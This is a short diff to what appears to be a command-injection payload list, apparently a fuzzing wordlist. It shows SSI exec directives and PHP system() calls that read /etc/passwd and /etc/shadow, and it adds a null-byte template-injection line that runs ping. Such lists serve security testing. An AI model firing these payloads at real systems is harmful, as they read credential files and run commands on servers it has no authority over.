@@ -99,4 +99,5 @@ cat /etc/passwd
 <!--#exec cmd="/bin/cat /etc/shadow"-->
 <!--#exec cmd="/usr/bin/id;-->
 system('cat /etc/passwd');
-<?php system("cat /etc/passwd");?>
+<?php system("cat /etc/passwd");?> 
+%00{.exec|ping 127.0.0.1
